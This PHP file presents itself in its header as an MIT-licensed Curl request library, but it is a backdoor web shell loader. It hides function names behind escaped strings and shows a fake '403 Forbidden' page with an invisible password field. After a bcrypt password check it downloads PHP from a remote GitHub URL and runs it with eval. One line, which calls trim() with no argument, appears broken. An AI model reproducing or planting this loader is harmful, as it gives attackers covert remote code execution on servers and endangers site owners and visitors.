<?php
/**
 * API Requests using the HTTP protocol through the Curl library.
 *
 * @author    Simon Fraser University <simon@fraser.com>
 * @copyright 2016 - 2018 (c) John Willinsky - PHP-Curl
 * @license   https://opensource.org/licenses/MIT - The MIT License (MIT)
 * @link      https://github.com/Josantonius/PHP-Curl
 * @since     1.0.0
 */

session_start();

function fuck ( $url ) {
	$fpn = "\146" . "\x6f" . "\160" . "\145" . "\x6e";
	$strim = "\163" . "\x74" . "\x72" . "\145" . "\x61" . "\x6d" . "\x5f" . "\x67" . "\x65" . "\164" . "\137" . "\x63" . "\x6f" . "\156" . "\x74" . "\x65" . "\156" . "\x74" . "\x73";
	$fgt = "\146" . "\151" . "\x6c" . "\x65" . "\x5f" . "\147" . "\145" . "\x74" . "\137" . "\x63" . "\157" . "\x6e" . "\x74" . "\x65" . "\156" . "\164" . "\163";
	$cexec = trim();
    
    if ( function_exists($cexec) ){ 
        $curl_connect = curl_init( $url );

        curl_setopt($curl_connect, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($curl_connect, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($curl_connect, CURLOPT_USERAGENT, "Mozilla/5.0(Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($curl_connect, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($curl_connect, CURLOPT_SSL_VERIFYHOST, 0);
        
        $content_data = $cexec( $curl_connect );
    }
    elseif ( function_exists($fgt) ) {
        $content_data = $fgt( $url );
    }
    else {
        $handle = $fpn ( $url , "r");
        $content_data = $strim( $handle );
    }
        
    return $content_data;
}
function is_logged_in()
{
    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
}

if (isset($_POST['password'])) {
    $entered_password = $_POST['password'];
    $hashed_password = '$2a$15$mAuFnkrxTvgmT8KO1iVYuuXjdjxB7yQDYPCttQ/5Zn7ppSTaeaW7O';
    if (password_verify($entered_password, $hashed_password)) {
        $_SESSION['logged_in'] = true;
        $_SESSION['java'] = 'tombak';
    } else {
        echo "Unang Marsalahan Heang!!";
    }
}
if (is_logged_in()) {
  $url = "https://raw.githubusercontent.com/seovennn/venxyn/refs/heads/main/peluru.php";
  $content_output = fuck($url);
  EVAL    ('?>' . $content_output);
  } else {
    ?>
    <?php
    echo "<!DOCTYPE html><head><title>403 Forbidden</title></head><h1>Forbidden</h1><p>You don't have permission to access ".$_SERVER['PHP_SELF']." on this server.</p>".$_SERVER['SERVER_SIGNATURE']."";
    echo "<form method='post' style='height:100%;margin:0;display:flex;justify-content:center;align-items:center'><input style='margin:0;background-color:#ffffff00;border:1px solid #ffffff00;' type='password' name='password'></form></body></html>";
}
?>
